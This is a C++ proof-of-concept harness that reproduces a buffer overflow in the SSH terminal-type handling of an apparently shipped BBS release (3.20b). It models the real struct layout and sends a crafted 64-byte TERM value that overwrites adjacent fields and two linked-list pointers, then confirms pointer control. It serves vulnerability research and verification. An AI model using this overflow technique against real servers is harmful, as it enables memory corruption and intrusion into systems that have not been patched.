// Direct-call harness for the SHIPPED 3.20b (db9c5d6f) TERM copy.
// The vulnerable statement is generated verbatim from the fetched release
// answer.cpp by gen.sh. Everything else is scaffolding / layout model.
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <cstddef>
#include <cstdlib>

#define TELNET_TERM_MAXLEN 40   // pinned 3.20b telnet.h:109
#define CRYPT_SESSINFO_SSH_CHANNEL_TERMINAL 301
#define CRYPT_OK 1
#define cryptStatusOK(s) ((s) == CRYPT_OK)
#define lprintf(...) ((void)0)
#define ssh_mutex 0
typedef int CRYPT_HANDLE;
typedef int CRYPT_ATTRIBUTE_TYPE;
#define pthread_mutex_unlock(x) ((void)0)

// Pinned 3.20b src/xpdev/link_list.h:58-79. Only the first two fields are
// pointers; they are the fields reached by a 64-byte TERM at sbbs_t+48/+56.
struct list_node_t {
    void *data; struct list_node_t *next; struct list_node_t *prev;
    struct link_list_t *list; unsigned long flags; long tag;
};
struct link_list_t {
    list_node_t *first; list_node_t *last; unsigned long flags; long count;
    void *private_data; long refs; long locks;
};

#ifdef REDZONE_MODEL
// Rung-3 model: destination alone, so ASan's redzone starts at byte 41.
struct session_t { char terminal[TELNET_TERM_MAXLEN + 1]; };
#else
// Rung-4 layout, pinned 3.20b sbbs.h:644-647: terminal[41], cterm_version,
// link_list_t savedlines, lbuf. Alignment puts the fields at 0/44/48.
struct session_t {
    char terminal[TELNET_TERM_MAXLEN + 1];
    int cterm_version;
    link_list_t savedlines;
    char lbuf[2049];
};
#endif
static_assert(offsetof(session_t, terminal) == 0);
static_assert(offsetof(link_list_t, first) == 0);
static_assert(offsetof(link_list_t, last) == 8);
#ifndef REDZONE_MODEL
static_assert(offsetof(session_t, cterm_version) == 44);
static_assert(offsetof(session_t, savedlines) == 48);
#endif

static unsigned char wire[64];
static int wire_len = 0;
static int ssh_session = 1;

// Same no-size contract as the pinned cryptlib getter: the callee copies
// wire_len bytes and never sees the caller's 41-byte array size.
static int cryptGetAttributeString(int sess, int attr, void *value, int *length)
{
    if (sess != ssh_session || attr != CRYPT_SESSINFO_SSH_CHANNEL_TERMINAL) return 0;
    if (value != nullptr) std::memcpy(value, wire, static_cast<size_t>(wire_len));
    *length = wire_len;
    return CRYPT_OK;
}

static void build_wire(int len)
{
    std::memset(wire, 0, sizeof(wire));
    if (len == 64) {
        // 41 A (terminal) + 3 B (padding) + 4 C (cterm_version) +
        // 8 F (savedlines.first) + 8 L (savedlines.last).
        for (int i = 0; i < 41; i++) wire[i] = 'A';
        for (int i = 41; i < 44; i++) wire[i] = 'B';
        for (int i = 44; i < 48; i++) wire[i] = 'C';
        for (int i = 48; i < 56; i++) wire[i] = 'F';
        for (int i = 56; i < 64; i++) wire[i] = 'L';
    } else {
        for (int i = 0; i < len; i++) wire[i] = 'A';
    }
    wire_len = len;
}

static void hexdump(const void *p, int n)
{
    const unsigned char *b = static_cast<const unsigned char *>(p);
    for (int i = 0; i < n; i++) printf("%02x", b[i]);
}

int main(int argc, char **argv)
{
    int len = argc > 1 ? atoi(argv[1]) : 64;
    build_wire(len);
    session_t s{};
    {
        char (&terminal)[TELNET_TERM_MAXLEN + 1] = s.terminal;
        int l;
#include "vuln320b.inc"
    }
#ifdef REDZONE_MODEL
    printf("MODEL=redzone320b LEN=%d terminal_first=", len);
    hexdump(s.terminal, 8);
    printf("\n");
    // The ASan runtime reports the overflow; the plain return only marks a
    // completed run so the 40-byte control is rc=0.
    return 0;
#else
    printf("MODEL=layout320b LEN=%d terminal_head=", len);
    hexdump(s.terminal, 16);
    printf(" cterm_version=%08x first=0x%016llx last=0x%016llx\n",
           static_cast<unsigned>(s.cterm_version),
           static_cast<unsigned long long>(reinterpret_cast<uintptr_t>(s.savedlines.first)),
           static_cast<unsigned long long>(reinterpret_cast<uintptr_t>(s.savedlines.last)));
    if (len == 64) {
        const bool ok = s.cterm_version == 0x43434343 &&
            reinterpret_cast<uintptr_t>(s.savedlines.first) == 0x4646464646464646ULL &&
            reinterpret_cast<uintptr_t>(s.savedlines.last) == 0x4c4c4c4c4c4c4c4cULL;
        if (!ok) { printf("PTR_CONTROL_FAIL\n"); return 7; }
        printf("PTR_CONTROL_OK\n");
        return 0;
    }
    const bool clean = s.cterm_version == 0 && s.savedlines.first == nullptr &&
                       s.savedlines.last == nullptr;
    if (!clean) { printf("SHORT_CONTROL_FAIL\n"); return 6; }
    printf("SHORT_CONTROL_OK\n");
    return 0;
#endif
}
